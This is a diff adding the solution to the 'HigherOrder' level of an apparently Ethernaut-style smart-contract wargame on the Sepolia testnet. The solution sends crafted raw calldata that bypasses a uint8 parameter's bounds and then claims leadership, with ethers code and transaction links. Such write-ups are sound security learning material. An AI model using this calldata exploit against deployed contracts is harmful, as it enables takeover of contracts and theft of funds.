@@ -549,3 +549,36 @@ let wallet = new _ethers.Contract(walletAddr, walletABI, signer)
 
 - The key is to send a low-level call, with the following hex data:
   `0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000`
+
+## Problem 30: HigherOrder
+
+- creation tx: [0x66797a4a76ca2c5a7967830163d4dbca09383c6fe446765e9b89629e0855e584](https://sepolia.etherscan.io/tx/0x66797a4a76ca2c5a7967830163d4dbca09383c6fe446765e9b89629e0855e584)
+- HigherOrder contract: [0x73Aaa9313BcbE60C2B65EEF58Ab195231BaEc1Fa](https://sepolia.etherscan.io/address/0x73Aaa9313BcbE60C2B65EEF58Ab195231BaEc1Fa)
+
+**Solution**
+- The key is even though function `registerTreasury(uint8)` takes **uint8** as a parameter. In `solc` v0.6.12, parameter calldata is encoded as bytes32 and does not perform any boundary check, so one can construct a calldata that is above 255 in the parameter.
+
+  In **HigherOrder.t.sol**, such a calldata is constructed at:
+
+  ```sol
+  bytes memory callData = abi.encodeWithSelector(HigherOrder.registerTreasury.selector, bytes32(uint256(256)));
+
+  // The value is: `0x211c85ab0000000000000000000000000000000000000000000000000000000000000100`
+  ```
+
+- Execute the following:
+
+  ```ts
+  let provider = new _ethers.providers.Web3Provider(window.ethereum);
+  let signer = provider.getSigner();
+
+  await signer.sendTransaction({
+    to: contract.address,
+    data: "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100",
+  });
+
+  await contract.claimLeadership()
+  ```
+
+- registerTreasury tx: [0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc](https://sepolia.etherscan.io/tx/0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc)
+- claimLeadership tx: [0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f](https://sepolia.etherscan.io/tx/0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f)
